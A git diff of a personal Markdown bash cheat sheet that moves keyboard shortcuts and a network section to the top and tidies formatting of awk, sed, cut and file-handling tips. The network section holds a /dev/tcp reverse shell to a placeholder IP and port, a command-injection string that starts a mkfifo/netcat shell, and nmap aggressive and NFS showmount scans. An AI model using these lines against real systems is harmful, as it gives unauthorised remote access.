@@ -1,7 +1,68 @@
+# Bash Navigation
+
+`Ctrl A`: Move to the beginning of the command
+`Ctrl E`: Move to the end of the command
+`Alt F`: Move forward one word in command line 
+`Alt B`: Move backward one word in command line 
+
+* Clear from cursor to the beginning of a line
+```bash
+CTRL + u
+```
+
+* Clear from cursor to the end of a line
+```bash
+CTRL + k
+```
+
+* Clears one character to the right of cursor 
+```bash
+CTRL + d
+```
+
+* Clears one word to the left of the cursor
+```bash
+ESC + Backspace
+```
+
+* Clears one word to the right of the cursor
+```bash
+ESC + d
+```
+* Reverse Search
+`Ctrl R`: Start reverse search
+`Ctrl R`: Once started, will bring you to the next recent match
+
+`Ctrl G`: Quits reverse search, and preserve the command already typed
+
+# Network commands
+* nmap -A: Aggressive mode
+```bash
+nmap -A IP
+```
+* Interactive bash shell
+```bash
+/bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1
+```
+
+* Another way to get reverse shell with command execution
+```bash
+192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
+```
+
+* Scanning all services given a server with `nmap`
+```bash
+nmap -A 192.168.0.1
+```
+
+* Show possible mount point given a server that is running NFS
+```bash
+showmount -e 192.168.0.1
+```
 
 # String Manipulation
 
-* `awk` with print. Prints first field.
+* `awk` with print. prints first field.
 ```bash
 echo "Hello World" | awk '{print $1}'
 ```
@@ -23,14 +84,15 @@ cat file.txt | tr -d ' '
 cat file.txt | tr -s '.'
 ```
 
-* cut with tabs ... there is an easy way... `cut` by default split by tabs...
+* `cut` with tabs; `cut` by default split by tabs...
 ```bash
 cat FILE | cut -d $'\t' -f 2
 ```
 ```
 cat FILE | cut -f 2
 ```
-* Print out the content of a file at LINE number (-n in sed is quiet), p = print
+
+* Print out the content of a file at `LINE` number `-n` in sed is quiet), `p`: print
 ```bash
 awk 'NR=LINE{print}' FILE
 sed -n -e LINEp FILE
@@ -90,7 +152,7 @@ ls | grep mp3 | xargs -I file cp file dir/
 ls | grep -avf "BLACKLIST" | xargs -I file COMMANDS file
 ```
 
-* Print out the content of a file at LINE number (`-n` in sed is quiet), p = print
+* Print out the content of a file at LINE number; `-n`: quiet, `p`: print
 ```bash
 awk 'NR=LINE{print}' FILE
 sed -n -e LINEp FILE
@@ -104,7 +166,7 @@ sed -n -e '100,110 p' FILE
 sed -n 100,110p FILE
 ```
 
-* Output the first X line of a file
+* Output the first `X` line of a file
 ```bash
 sed 'X{p;q}' FILE
 head -n X FILE
@@ -112,7 +174,7 @@ head -n X FILE
 
 # File Manipulation
 
-* Shuffles the lines of a file -R = random
+* Shuffles the lines of a file `-R`: random
 ```bash
 sort -R playlist -o playlist
 ```
@@ -127,7 +189,7 @@ shuf FILE | tee FILE
 7z x -scs903 ZIPFILE.zip
 ```
 
-* Insert a newline at a specific line with sed -i [--in-place]
+* Insert a newline at a specific line with sed `-i` `[--in-place]`
 ```bash
 sed -i '$LINE_NUMi \n' foo.txt 
 ```
@@ -137,7 +199,7 @@ sed -i '$LINE_NUMi \n' foo.txt
 ls | while read f; do while read -r line; do echo $line; done < $f ; done
 ```
 
-* Copy an entire directory to another directory
+* Copy an entire directory to another directory; `-r` = `-R`
 ```bash
 cp -R source dest
 ```
@@ -175,7 +237,7 @@ jobs
 ps
 ```
 
-* Retrieve the first word from stdout
+* Retrieve the first word from stdout using `awk` and `cut`
 ```bash
 echo "hello world" | awk '{print $1;}'
 ```
@@ -198,7 +260,7 @@ nohup COMMAND >/dev/null 2>&1 &
 xclip -sel clip < FILE
 ```
 
-* kill a process with ps
+* kill a process with `ps`
 ```bash
 ps -eaf | grep vim
 kill 1337
@@ -207,7 +269,7 @@ kill 1337
 kill $(ps | grep play | awk '{print $1;}')
 ```
 
-* kill a process with pkill (MUCH EASIER :D)
+* kill a process with `pkill` (MUCH EASIER :D)
 ```bash
 pkill vim
 ```
@@ -225,7 +287,7 @@ tar xf FILE.tar.xz
 
 * Change directory to the output of a command
 ```bash
-cd "$(dirname "$(which FILE)" )"
+cd "$(dirname "$(which COMMAND)" )"
 ```
 
 * Change directory to the previous directory!
@@ -252,17 +314,17 @@ sudo apt install rpm2cpio
 rpm2cpio /path-to-file.rpm | cpio -i --make-directories
 ```
 
-* 7z is officially weird... the arguments it take have to be right afterwards...
+* `7z` is officially weird... the arguments it take have to be right afterwards...
 ```bash
 7z x ZIP.zip -oEXTRACTED
 ```
 
-* grip. Using grip to build markdown files locally. -b: opens up a browser tab. (Need to install a repo)
+* `grip`. Using grip to build markdown files locally. `-b`: opens up a browser tab. (Need to install a repo)
 ```bash
 grip -b FILE.md
 ```
 
-* Reading certain types of file line by line with find
+* Reading certain types of file line by line with `find`
 ```bash
 for file in $(find . -type f -name "*.txt")
 do
@@ -270,7 +332,7 @@ cat $file
 done
 ```
 
-* Redirection
+## Redirection
 
 `ls DIR > dirlist`
 `>` Redirects output
@@ -280,29 +342,17 @@ done
 `&>>` does the above in post Bash 4.0 and apending it to a file
 `&>` does the above but overwrites the target file
 
-* nmap -A: Aggressive mode
-```bash
-nmap -A IP
-```
 
 * Check architecture
 ```bash
 dpkg --print-architecture
 ```
 
-* Interactive bash shell
-```bash
-/bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1
-```
 * Check OS version
 ```bash
 lsb_release -a
 ```
 
-* Another way to get reverse shell with command execution
-```bash
-192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
-```
 
 * Getting the current directory name in a cool way, it can be VERY USEFUL!
 ```bash
@@ -322,6 +372,7 @@ lscpu
 lsusb
 lsusb -D /dev/bus/usb/003/023
 ```
+
 * Copy to a target directory and make the directory if it does not exist. `mkdir`, `-p` creates all directories
 ```
 mkdir -p PATH && cp FILE PATH
@@ -336,15 +387,7 @@ pip freeze
 ```bash
 pip install -r requirements.txt
 ```
-* Scanning all services given a server with `nmap`
-```bash
-nmap -A 192.168.0.1
-```
 
-* Show possible mount point given a server that is running NFS
-```bash
-showmount -e 192.168.0.1
-```
 
 * List all the all current directories
 ```bash
@@ -355,41 +398,4 @@ ll | grep "^d"
 for i in $(ls -d */); do echo ${i%%/}; done
 ```
 
-# Navigation
-
-`Ctrl A`: Move to the beginning of the command
-`Ctrl E`: Move to the end of the command
-`Alt F`: Move forward one word in command line 
-`Alt B`: Move backward one word in command line 
-
-* Clear from cursor to the beginning of a line
-```bash
-CTRL + u
-```
-
-* Clear from cursor to the end of a line
-```bash
-CTRL + k
-```
-
-* Clears one character to the right of cursor 
-```bash
-CTRL + d
-```
-
-* Clears one word to the left of the cursor
-```bash
-ESC + Backspace
-```
-
-* Clears one word to the right of the cursor
-```bash
-ESC + d
-```
-* Reverse Search
-`Ctrl R`: Start reverse search
-`Ctrl R`: Once started, will bring you to the next recent match
-
-
-`Ctrl G`: Quits reverse search, and preserve the command already typed
 
